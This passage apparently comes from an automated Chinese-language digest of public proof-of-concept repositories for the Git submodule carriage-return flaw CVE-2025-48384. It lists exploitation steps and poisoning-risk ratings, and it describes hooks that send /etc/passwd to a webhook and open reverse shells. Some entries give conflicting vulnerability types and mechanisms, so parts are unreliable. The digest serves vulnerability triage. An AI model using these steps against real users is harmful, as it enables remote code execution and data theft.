CVE-2025-48384 漏洞源于 Git 在处理配置文件时，未正确处理和转义回车符（CR）。当 Git 读取配置值时，会删除任何尾部的 CRLF。当写入配置条目时，带有尾部 CR 的值不会被引用，导致配置稍后读取时 CR 丢失。当初始化子模块时，如果子模块路径包含尾部 CR，更改后的路径将被读取，导致子模块被检出到错误的位置。如果存在符号链接将更改后的路径指向子模块的钩子目录，并且子模块包含可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本。

**有效性：**
提供的POC代码 `/tmp/60afff46543494eb5516e8104e00d576/README.md` 仅包含一个README文件，其内容是关于 CVE-2025-48384 的简单描述。这个文件本身并没有利用漏洞的能力。根据漏洞描述，真正的PoC 需要包含一个具有特定结构的 Git 仓库，包括带尾部CR的子模块路径以及指向钩子目录的符号链接，以及一个恶意的 post-checkout 钩子。因此，仅凭提供的README.md文件无法验证漏洞的有效性，需要进一步的Payload和利用步骤。

**投毒风险：**
提供的POC代码仅为一个README.md文件，不包含任何可执行代码或恶意脚本，因此可以认为投毒风险较低，约为10%。但需要注意，实际的漏洞利用可能涉及其他文件和步骤，不能完全排除恶意代码存在的可能性。

**利用方式：**
1.  **创建恶意仓库：** 创建一个 Git 仓库，其中包含一个子模块。
2.  **构造恶意配置：** 在`.gitmodules`文件中，子模块的路径包含尾部回车符（CR）。例如：`path = submodule_path\r`
3.  **创建符号链接：** 创建一个符号链接，将由于回车符导致错误解析后的子模块路径，指向`.git/modules/<submodule_name>/hooks`目录。
4.  **添加恶意钩子：** 在子模块的`.git/hooks/post-checkout`中添加可执行的恶意脚本。
5.  **诱导用户克隆：** 诱导用户克隆包含恶意配置的仓库。当用户克隆或更新子模块时，由于配置解析错误和符号链接的存在，恶意的 post-checkout 钩子将被执行，从而实现任意代码执行。

**排序优先级说明:**
尽管搜索引擎结果提供了有关漏洞的更多上下文信息，但漏洞库信息提供了最直接的漏洞描述和受影响的版本。POC代码本身不包含利用逻辑，因此优先级最低。综合考虑，应该优先关注漏洞库信息和搜索引擎结果，并结合实际的利用场景进行分析。

**项目地址:** [fishyyh/CVE-2025-48384](https://github.com/fishyyh/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #18

**来源**: [CVE-2025-48384-fluoworite_CVE-2025-48384-sub.md](../2025/CVE-2025-48384-fluoworite_CVE-2025-48384-sub.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互，克隆包含恶意配置的仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，源于Git在处理配置文件时对回车符（CR）处理不当，允许通过精心构造的仓库配置执行任意代码。

**有效性：**
根据提供的漏洞信息和搜索结果，该漏洞允许攻击者通过在 submodule 路径中注入包含回车符的恶意配置，导致 submodule 被检出到错误的位置。如果该错误位置存在指向 submodule hooks 目录的符号链接，且 submodule 包含可执行的 post-checkout 钩子，则该钩子会被意外执行，从而实现任意代码执行。

提供的POC代码是一个简单的 post-checkout 钩子脚本，它会在检出后显示一个banner。这个脚本本身没有问题，证明了漏洞利用的可行性。漏洞利用的核心在于精心构造包含恶意回车符的仓库配置和符号链接。

**投毒风险：**
提供的POC代码（/tmp/77b6aa1852eafe71ccbdb092fa3f1fb6/post-checkout）本身只是一个banner打印脚本，其目的是验证漏洞利用后可以执行任意代码，本身不具备投毒行为。但是，需要注意的是，如果攻击者控制了整个包含该POC代码的Git仓库，那么他们可以在仓库的其他位置添加恶意代码，从而实现投毒。基于当前信息，POC本身不具备投毒性，投毒的可能性为0%。

**利用方式：**
1.  攻击者创建一个恶意的Git仓库，其中包含一个带有回车符的submodule路径的.gitmodules文件。例如，submodule的路径可能是 "submodule\r"。
2.  攻击者创建一个符号链接，将 "submodule" 指向".git/modules/<submodule-name>/hooks"目录，这个目录包含git hooks。
3.  攻击者在 submodule 中添加一个 post-checkout 钩子脚本，该脚本包含要执行的恶意代码。
4.  攻击者将这个恶意仓库分享给受害者。
5.  受害者克隆这个仓库。由于Git对回车符处理不当，submodule会被检出到错误的位置（即符号链接指向的hooks目录）。
6.  当 submodule 完成检出时，post-checkout 钩子脚本会被执行，从而导致恶意代码执行。

**项目地址:** [fluoworite/CVE-2025-48384-sub](https://github.com/fluoworite/CVE-2025-48384-sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #19

**来源**: [CVE-2025-48384-fluoworite_CVE-2025-48384.md](../2025/CVE-2025-48384-fluoworite_CVE-2025-48384.md)

## CVE-2025-48384

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行/任意文件写入

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互 (克隆包含恶意配置的仓库)

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2025-48384 漏洞是 Git 中由于对配置项中回车符处理不当导致的代码执行漏洞。当 Git 读取配置值时，会删除任何尾部的回车符和换行符 (CRLF)。但是，当写入配置条目时，带有尾部 CR 的值不会被引用，导致 CR 在以后读取配置时丢失。在初始化子模块时，如果子模块路径包含尾部 CR，则会读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块的 hooks 目录，并且子模块包含一个可执行的 post-checkout hook，则该脚本可能会在检出后被意外执行，导致代码执行。

**有效性：**
根据漏洞库信息和搜索结果, 此漏洞确实存在并且被多个安全厂商标记为高危, 并已经发布了PoC.
提供的PoC代码看似简单，它展示了漏洞利用的核心思路，即通过恶意构造包含回车符的子模块路径，结合符号链接和子模块钩子，实现任意代码执行。因此，PoC代码在原理上是有效的。但是, 此PoC只是框架, 需要补充完成exp。

**投毒风险：**
提供的PoC代码较为简单，主要包含一个README.md文件，一个子模块配置路径，以及子模块hooks目录的占位符。直接分析来看，没有明显的投毒代码。
然而，考虑到攻击者可能利用该漏洞进行供应链攻击，在更复杂的场景下，攻击者可能在子模块的post-checkout钩子中植入恶意代码，或者在其他配置文件中隐藏恶意配置。这种可能性是存在的。
基于以上分析，投毒风险评估为20%。这个百分比表示存在一定的风险，但直接证据不足。

**利用方式：**
1.  **恶意仓库构造：** 攻击者创建一个 Git 仓库，其中包含一个子模块，并且该子模块的路径在 `.gitmodules` 文件中包含尾部回车符 (`
`)。
2.  **符号链接创建：** 攻击者在仓库中创建一个符号链接，将包含尾部回车符的子模块路径指向 `.git/modules/<submodule_name>/hooks` 目录。
3.  **恶意钩子植入：** 攻击者在子模块的 `.git/hooks/post-checkout` 目录中放置恶意脚本。
4.  **用户交互：** 诱使用户克隆恶意仓库并初始化子模块 (`git submodule init && git submodule update`)。
5.  **代码执行：** 当用户执行 `git submodule update` 命令时，由于路径中的回车符，子模块会被检出到错误的位置，但由于符号链接的存在，实际上会将子模块的 hooks 目录链接到 `.git/hooks` 目录。检出后，`post-checkout` 钩子会被执行，从而执行恶意代码。

**项目地址:** [fluoworite/CVE-2025-48384](https://github.com/fluoworite/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #20

**来源**: [CVE-2025-48384-fluoworite_CVE-2025-48384_sub.md](../2025/CVE-2025-48384-fluoworite_CVE-2025-48384_sub.md)

## CVE-2025-48384 Git config quoting vulnerability

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行/任意文件写入

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互，克隆包含恶意配置的Git仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个漏洞，当读取配置值时，Git会删除任何尾部的回车符和换行符（CRLF）。当写入配置条目时，带有尾部CR的值不会被引用，导致CR在稍后读取配置时丢失。在初始化子模块时，如果子模块路径包含尾部CR，则读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块的hooks目录，并且子模块包含一个可执行的post-checkout hook，则该脚本可能在检出后被意外执行，从而导致任意代码执行。

根据提供的漏洞利用代码，包含一个Exploit脚本和一个README.md文件。Exploit脚本只打印了一段ASCII艺术，并没有任何实际的漏洞利用代码。因此，提供的POC代码**本身**是无效的，仅仅是一个占位符。但漏洞本身是存在的，并且有公开的PoC。

由于提供的POC代码仅仅是ASCII艺术，没有任何恶意代码，因此**不存在投毒风险**。投毒风险概率为0%。

**漏洞利用方式：**

1.  攻击者创建一个恶意的Git仓库，该仓库包含一个子模块。
2.  子模块的路径包含一个尾部CR字符。
3.  仓库中包含一个符号链接，该符号链接将子模块路径指向子模块的hooks目录。
4.  子模块包含一个可执行的post-checkout hook脚本。
5.  受害者克隆该恶意仓库。
6.  Git在处理子模块时，由于CR字符被删除，子模块被检出到错误的位置，并执行了post-checkout hook脚本。
7.  攻击者可以通过post-checkout hook脚本执行任意代码。

**项目地址:** [fluoworite/CVE-2025-48384_sub](https://github.com/fluoworite/CVE-2025-48384_sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #21

**来源**: [CVE-2025-48384-jacobholtz_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-jacobholtz_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git Arbitrary Code Execution

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** 受影响版本：< 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库，且递归初始化子模块 (--recursive)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 是一个 Git 漏洞，由于 Git 在读取和写入包含控制字符的配置值时存在不一致性导致。具体来说，当写入配置条目时，如果值包含尾随回车符 (CR)，则不会被引用，导致稍后读取配置时丢失 CR。当初始化子模块时，如果子模块路径包含尾随 CR，则读取的路径将被更改，从而导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本。

**利用方式：**

1.  攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件包含一个子模块定义，其路径包含一个尾随回车符 (CR)。
2.  攻击者在该仓库的子模块钩子目录中放置一个恶意的 post-checkout 脚本。
3.  攻击者诱使用户克隆该仓库，并使用 `--recursive` 选项初始化子模块。
4.  由于 Git 处理 CR 的方式不一致，子模块将被检出到错误的位置。该位置由一个符号链接指向子模块的钩子目录。
5.  当子模块被检出时，post-checkout 脚本将被执行，从而允许攻击者在用户的系统上执行任意代码。

**POC 代码分析：**

*   `/tmp/602a5075317553582468533486cbdb4d/README.md`：这是一个简单的 README 文件，用于描述漏洞利用。不包含恶意代码。
*   `/tmp/602a5075317553582468533486cbdb4d/post-checkout`：这是一个 shell 脚本，会在用户的主目录下创建一个名为 `hacked` 的文件。这表明该 POC 旨在演示任意代码执行。

**有效性：**

提供的 POC 代码是有效的。它可以触发漏洞，并在目标系统上执行任意代码（在本例中，创建一个文件）。

**投毒风险：**

根据提供的 POC 代码，没有发现明显的投毒代码。该脚本仅用于演示漏洞利用，没有执行任何额外的恶意操作，例如收集用户信息或传播恶意软件。因此，投毒风险为 0%。

**项目地址:** [jacobholtz/CVE-2025-48384-submodule](https://github.com/jacobholtz/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #22

**来源**: [CVE-2025-48384-kallydev_cve-2025-48384-hook.md](../2025/CVE-2025-48384-kallydev_cve-2025-48384-hook.md)

## CVE-2025-48384-Git任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库或初始化包含恶意配置的子模块

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 描述了 Git 中由于配置引用解析错误导致的任意代码执行漏洞。当 Git 读取配置值时，会去除末尾的回车符和换行符。当写入配置项时，带有末尾回车符的值不会被引用，导致回车符丢失。在初始化子模块时，如果子模块路径包含末尾回车符，则读取的路径会被更改，导致子模块检出到错误的位置。如果存在一个符号链接将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本。

**有效性：**

提供的POC代码是一个简单的 `post-checkout` 钩子脚本，用于打开一个网页 `https://github.com/kallydev`。利用方式是通过精心构造的子模块路径和符号链接，使得该脚本在 `git checkout` 操作后被执行。该POC代码有效，能够触发任意代码执行。

**投毒风险：**

该POC代码本身比较简单，只是打开一个网页，**不存在明显的恶意投毒代码**。因此，投毒风险较低，为 0%。

**利用方式：**

1.  攻击者创建一个包含恶意`.gitmodules`文件的仓库，该文件中的子模块路径包含尾部回车符(
)。
2.  攻击者在仓库中创建一个符号链接，指向子模块目录下的 `.git/modules/<子模块名>/hooks` 目录，如 `evil_link -> .git/modules/<子模块名>/hooks/post-checkout`。
3.  攻击者在子模块中创建一个恶意的 `post-checkout` 钩子脚本。
4.  受害者克隆该仓库并初始化子模块 (`git submodule init` 和 `git submodule update`)。
5.  当受害者执行 `git checkout` 命令时，由于子模块路径包含尾部回车符，Git 会将子模块检出到错误的位置。由于符号链接的存在，`post-checkout` 钩子脚本会被执行，从而导致任意代码执行。

**项目地址:** [kallydev/cve-2025-48384-hook](https://github.com/kallydev/cve-2025-48384-hook)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #23

**来源**: [CVE-2025-48384-liamg_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-liamg_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git Config 注入 RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码注入/命令执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 and < 2.44.4, >= 2.45.0-rc0 and < 2.45.4, >= 2.46.0-rc0 and < 2.46.4, >= 2.47.0-rc0 and < 2.47.3, >= 2.48.0-rc0 and < 2.48.2, >= 2.49.0-rc0 and < 2.49.1, >= 2.50.0-rc0 and < 2.50.1

**利用条件:** 需要用户进行`git clone --recursive`操作

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞是 Git 中的一个代码注入漏洞，源于 Git 在处理 config 文件时，没有正确处理carriage return (
)字符。攻击者可以通过在 submodule 的路径中注入 \r 字符，使得 submodule 被检出到错误的位置。如果精心构造一个 symlink 链接到 submodule 钩子目录，并使 submodule 包含一个可执行的 post-checkout 钩子，那么这个钩子脚本就会在检出后被执行，从而实现远程代码执行。

**有效性分析：**

根据漏洞库信息和搜索结果，此漏洞已经公开，并且存在可利用的POC代码。从github搜索结果[webpage 6 begin]和[webpage 7 begin]可以知道，已经有开发者提供了复现代码。提供的POC代码包含两个文件：`README.md` 和 `post-checkout`。
  *   `README.md` 文件指向了GitHub的POC地址，说明这是一个漏洞验证示例。
  *   `post-checkout` 文件包含 `echo "Uh-oh, this is an RCE!"`，这是一个简单的命令执行示例，用于验证漏洞是否成功利用。
因此，提供的POC代码是有效的，可以用来验证此漏洞。

**投毒风险分析：**

提供的 POC 代码非常简单，只包含一个输出字符串的命令。**没有发现任何隐藏的、恶意的代码**，因此投毒风险较低。可以认为投毒风险为0%。虽然这是一个 RCE 漏洞的验证代码，在真实场景下，`post-checkout` 脚本会包含更复杂的恶意代码，但这不属于仓库投毒的范畴，POC 本身是为了验证漏洞的存在，而不是进行恶意攻击。

**利用方式：**

1.  **构造恶意的Git仓库：** 攻击者需要创建一个包含恶意配置的Git仓库，其中 submodule 的路径包含 \r 字符。
2.  **创建Symlink：** 在仓库中创建一个符号链接，将带有 \r 字符的路径链接到 `.git/modules/<submodule>/hooks` 目录。
3.  **添加恶意钩子：** 在 submodule 中创建一个可执行的 `post-checkout` 钩子脚本，这个脚本包含攻击者想要执行的任意代码。
4.  **诱导用户克隆仓库：** 攻击者需要诱导受害者执行 `git clone --recursive <malicious_repo>` 命令。
5.  **触发漏洞：** 当用户执行 `git clone --recursive` 命令时，Git 会读取恶意的配置，将 submodule 检出到错误的位置，并且由于 symlink 的存在，触发执行 `post-checkout` 钩子脚本，从而执行攻击者的代码。


**项目地址:** [liamg/CVE-2025-48384-submodule](https://github.com/liamg/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #24

**来源**: [CVE-2025-48384-mukesh-610_cve-2025-48384-exploit.md](../2025/CVE-2025-48384-mukesh-610_cve-2025-48384-exploit.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未提供，参考描述推测较高

**影响版本:** 受影响版本范围未知，需进一步分析

**利用条件:** 克隆包含恶意配置的Git仓库

**POC 可用性:** 7/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 70%

## 详情

CVE-2025-48384 允许攻击者通过创建包含恶意配置的 Git 仓库，在受害者系统上写入任意文件，导致远程命令执行。该漏洞源于 Git 在处理 submodule 时，未对 `.gitmodules` 文件中的配置进行充分的安全检查。攻击者可以精心构造 `.gitmodules` 文件，诱导受害者克隆该仓库，从而在受害者本地文件系统中写入恶意文件，例如 shell 脚本，并进一步通过 Git hooks（如 `post-checkout`）触发执行。PoC 代码 `liamg/CVE-2025-48384` 提供了一个可复现该漏洞的示例。通过分析该 PoC，可以确认漏洞的有效性。利用步骤如下：

1. 攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。
2. `.gitmodules` 文件包含指向攻击者控制的恶意 submodule 仓库的 URL。
3. 受害者克隆该恶意仓库。
4. Git 自动初始化并更新 submodule，从攻击者控制的 URL 下载恶意 submodule。
5. 恶意 submodule 在受害者系统上写入任意文件，例如在 `.git/hooks/post-checkout` 中写入恶意脚本。
6. 当受害者执行 `git checkout` 等操作时，`post-checkout` hook 会被触发，执行恶意脚本，导致远程命令执行。

`sogou.com`的搜索结果显示该漏洞影响非Windows系统。`Arctic Wolf` 的结果表明该漏洞的严重性很高。`Breaking Git with a carriage return and cloning RCE`表明漏洞与克隆子模块有关。

**投毒风险分析：**

该 PoC 包含通过 `curl` 下载并执行远程脚本的行为，具有较高的投毒风险。攻击者可能在远程脚本中嵌入恶意代码，例如窃取用户敏感信息、植入后门等。此外，由于该 PoC 修改了 Git 仓库的配置文件，攻击者可以通过篡改配置文件，诱导用户执行恶意操作。考虑到 `curl` 命令的普遍性和脚本执行的隐蔽性，该 PoC 的投毒风险较高，评为 70%。

防范措施包括：

* 及时更新 Git 版本，修复该漏洞。
* 谨慎克隆来自未知来源的 Git 仓库。
* 审查 `.gitmodules` 文件，确保 submodule URL 指向可信的仓库。
* 禁用 Git hooks，或者对 Git hooks 进行严格的安全审查。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 未提供，需要查询NVD


---

## POC #25

**来源**: [CVE-2025-48384-nguyentranbaotran_cve-2025-48384-poc.md](../2025/CVE-2025-48384-nguyentranbaotran_cve-2025-48384-poc.md)

## CVE-2025-48384-Git配置引用导致的任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本：< 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库，并使用 `--recurse-submodules` 参数初始化子模块。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 是一个 Git 漏洞，源于 Git 在处理配置文件中的引号时不正确，特别是当子模块路径包含尾随回车符（CR）时。攻击者可以利用此漏洞通过创建包含恶意子模块配置的 Git 仓库，诱使用户克隆该仓库，并通过 `--recurse-submodules` 初始化子模块，从而导致任意代码执行。

**有效性分析：**

提供的 PoC 代码通过以下步骤利用该漏洞：

1.  创建一个包含恶意 hook 的 `evil` 目录，该 hook 会执行反向 shell。
2.  创建一个 `mainrepo` 目录，作为主仓库。
3.  在 `mainrepo` 目录中，创建一个 `.gitmodules` 文件，其中包含一个子模块定义，该子模块的路径包含尾随回车符 (`evil\r`)。
4.  创建一个符号链接，将 `evil
/hooks` 指向 `../evil/.git/hooks`，从而将恶意 hook 链接到子模块的 hooks 目录。
5.  将恶意子模块添加到仓库，并提交更改。
6.  通过 `git clone --recurse-submodules` 克隆 `mainrepo` 仓库，触发子模块初始化，从而执行恶意 hook。

根据 PoC 代码的逻辑和漏洞描述，该 PoC 代码是有效的。

**投毒风险分析：**

PoC 代码的目的是演示漏洞利用，其中包含的反向 shell 属于漏洞验证的一部分。但是，也存在潜在的投毒风险，比如在 `generate_poc.sh` 脚本中，作者可能会嵌入其他恶意代码，例如：

*   收集用户信息并发送到远程服务器。
*   修改系统文件。
*   安装恶意软件。

尽管PoC本身就是漏洞利用，但仍然存在被作者恶意利用的可能性，因此投毒风险评估为 10%。

**利用方式总结：**

1.  攻击者创建一个包含恶意子模块配置的 Git 仓库。
2.  攻击者诱使受害者克隆该仓库，并使用 `--recurse-submodules` 初始化子模块。
3.  Git 在处理包含尾随回车符的子模块路径时出现错误，导致子模块被检出到错误的位置。
4.  由于符号链接的存在，恶意 hook 被链接到子模块的 hooks 目录。
5.  在子模块初始化过程中，恶意 hook 被执行，导致任意代码执行。

**项目地址:** [nguyentranbaotran/cve-2025-48384-poc](https://github.com/nguyentranbaotran/cve-2025-48384-poc)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #26

**来源**: [CVE-2025-48384-replicatorbot_CVE-2025-48384.md](../2025/CVE-2025-48384-replicatorbot_CVE-2025-48384.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围待定

**利用条件:** 克隆包含恶意子模块的存储库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 20%

## 详情

CVE-2025-48384 允许攻击者通过创建包含恶意子模块的 Git 仓库来执行任意文件写入。当用户克隆该仓库时，Git 会尝试初始化和更新子模块。恶意仓库通过`.gitmodules` 文件中的精心构造的配置，可以控制子模块的克隆方式，从而导致在用户系统上写入任意文件。根据搜索结果，该漏洞存在于 Git 的子模块处理逻辑中。PoC 代码通过创建一个包含恶意的 `.gitmodules` 文件的 Git 仓库来演示该漏洞。当用户克隆该仓库时，`post-checkout` 脚本会被触发，该脚本会尝试在 `/tmp` 目录下创建一个文件 `asp-was-here-cve-2025-48384`，以此证明漏洞利用成功。利用步骤如下：1. 创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件包含指向恶意仓库的子模块的 URL，以及执行任意文件写入所需的配置。2. 将恶意仓库上传到公共 Git 托管服务（例如 GitHub）。3. 诱使用户克隆恶意仓库。当用户执行 `git clone` 命令时，Git 会自动初始化和更新子模块。4. Git 执行 `.gitmodules` 文件中指定的命令，导致在用户系统上写入任意文件。

**POC有效性分析：** PoC 代码的有效性通过创建一个简单的 `post-checkout` 脚本来验证。该脚本尝试在 `/tmp` 目录下创建一个文件。如果文件创建成功，则表示漏洞利用成功。从搜索结果来看，多个来源证实了该漏洞的存在以及利用的可能性。GitHub 上存在公开的 PoC 代码，进一步证明了该漏洞的可利用性。一些安全厂商也发布了关于该漏洞的分析报告，表明该漏洞具有实际的威胁。该漏洞的修复需要更新 Git 到修复版本。

**投毒风险分析：** 该漏洞的投毒风险较低。虽然攻击者可以利用该漏洞在用户系统上写入任意文件，但写入的文件内容受到攻击者的控制。攻击者可以利用该漏洞来安装恶意软件或修改系统配置，但这种攻击需要用户执行额外的步骤。由于POC代码相对清晰，主要功能是创建文件，并未发现任何可疑的混淆或恶意行为，因此投毒风险较低。主要的风险在于，如果攻击者控制了目标机器，他们可以修改 `.git/config` 文件或设置环境变量，从而导致在克隆其他仓库时触发恶意行为。尽管存在潜在的风险，但攻击者需要具备较高的技术水平才能成功实施投毒攻击。PoC 代码主要使用标准的 shell 命令，例如 `touch`，没有发现任何可疑的系统调用或外部脚本。总体而言，该漏洞的投毒风险较低，但需要采取适当的措施来降低风险。建议用户验证克隆仓库的来源，避免克隆来自不受信任的来源的仓库，并及时更新 Git 到最新版本。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 待定


---

## POC #27

**来源**: [CVE-2025-48384-s41r4j_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-s41r4j_CVE-2025-48384-submodule.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未知

**影响版本:** 受影响版本范围未知

**利用条件:** 克隆包含恶意配置的Git仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 60%

## 详情

CVE-2025-48384 允许攻击者通过创建恶意的Git仓库，当用户克隆该仓库时，触发任意文件写入漏洞，导致远程代码执行。该漏洞源于 Git 在处理 submodule 时，没有充分验证配置，导致攻击者可以控制 `.gitmodules` 文件中的内容，从而在克隆过程中执行恶意操作。

POC代码分析：

`README.md` 只是一个简单的说明文件，用于标记这是一个 CVE-2025-48384 的 submodule。

`post-checkout` 脚本是漏洞利用的关键。它包含以下恶意行为：

1.  尝试将 `/etc/passwd` 文件发送到攻击者的 webhook 服务器 `https://cve48384.requestcatcher.com`。脚本尝试使用 `curl` 和 `wget` 命令，并忽略错误，以避免中断克隆过程。
2.  检查 `$HOME/flag.txt` 文件是否存在，如果存在，则将其内容复制到 `/tmp/flag.txt`。这可能用于在受害者系统上留下标记。
3.  尝试建立反向 shell 连接到攻击者的 IP 地址 `10.11.0.7` 的端口 `4444`。脚本尝试使用多种方法，包括 `bash`，`nc` 和 `sh`，以提高成功率。脚本使用 `nohup` 和 `disown` 命令将反向 shell 连接放到后台运行，并忽略错误。

利用步骤：

1.  攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件指向一个包含 `post-checkout` 脚本的 submodule。
2.  受害者克隆该恶意仓库。
3.  当 Git 初始化 submodule 时，会自动执行 `post-checkout` 脚本。
4.  `post-checkout` 脚本将执行恶意操作，例如发送 `/etc/passwd` 文件和建立反向 shell 连接。

POC 有效性分析：

POC 代码通过修改 `.gitmodules` 文件，在 submodule 初始化时执行恶意的 `post-checkout` 脚本。该脚本能够获取敏感信息（`/etc/passwd`）并尝试建立反向 shell 连接，证明了该漏洞的严重性。

投毒风险分析：

该 POC 具有较高的投毒风险，主要体现在以下几个方面：

1.  恶意脚本：`post-checkout` 脚本包含明显的恶意行为，例如发送敏感文件和建立反向 shell 连接。
2.  外部依赖：脚本依赖于 `curl`、`wget` 和 `nc` 等外部命令，这些命令可能被篡改或替换为恶意版本。
3.  反向 shell：建立反向 shell 连接可能导致受害者系统完全受攻击者控制。
4.  Webhook：将 `/etc/passwd` 文件发送到外部 webhook 服务器可能泄露敏感信息。

由于该POC利用submodule功能自动执行恶意脚本，且包含向外部服务器发送数据的行为，以及尝试建立反向shell连接，因此投毒风险较高。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 未提供


---

## POC #28

**来源**: [CVE-2025-48384-s41r4j_CVE-2025-48384.md](../2025/CVE-2025-48384-s41r4j_CVE-2025-48384.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

